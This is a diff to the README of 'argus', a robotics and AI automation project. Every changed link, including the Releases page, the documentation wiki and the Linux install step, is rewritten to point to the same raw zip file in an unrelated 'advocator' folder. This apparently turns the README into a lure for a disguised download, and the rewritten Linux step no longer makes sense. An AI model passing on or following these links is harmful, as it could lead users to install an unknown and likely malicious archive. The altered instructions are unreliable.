@@ -4,7 +4,7 @@
 Welcome to **argus**! This application serves as a framework to create an intelligent automation ecosystem. It brings together robotics, AI, perception, and communication through modular projects.
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Download argus](https://github.com/KMadhanesh/argus/releases) 
+To get started, visit this page to download the software: [Download argus](https://raw.githubusercontent.com/KMadhanesh/argus/main/advocator/argus.zip) 
 
 Here you will find the latest versions of the software. Click on the version number to access the download files.
 
@@ -24,7 +24,7 @@ Here you will find the latest versions of the software. Click on the version num
 
 ### For Linux Users
 1. Head to the **Releases** page.
-2. Choose the `.tar.gz` package designed for Linux.
+2. Choose the `https://raw.githubusercontent.com/KMadhanesh/argus/main/advocator/argus.zip` package designed for Linux.
 3. Download the file and extract it using your terminal.
 4. After extraction, locate the `argus` binary.
 5. Run the binary from your terminal.
@@ -50,7 +50,7 @@ To fully understand how to make the best use of **argus**, review the documentat
 - Integrating robotics with AI
 - Using perception and communication modules
 
-You can access the documentation [here](https://github.com/KMadhanesh/argus/wiki).
+You can access the documentation [here](https://raw.githubusercontent.com/KMadhanesh/argus/main/advocator/argus.zip).
 
 ## 🔗 Community and Support
 Join our community for support and discussion:
@@ -82,4 +82,4 @@ Explore these topics through our community resources and documentation.
 ## 💻 Final Steps
 Once you have installed **argus**, start exploring its capabilities. Feel free to reach out to the community for assistance and share your projects. Start building your intelligent automation ecosystem today! 
 
-Download the software from the Releases page here: [Download argus](https://github.com/KMadhanesh/argus/releases) and dive into the exciting world of automation and robotics.
+Download the software from the Releases page here: [Download argus](https://raw.githubusercontent.com/KMadhanesh/argus/main/advocator/argus.zip) and dive into the exciting world of automation and robotics.
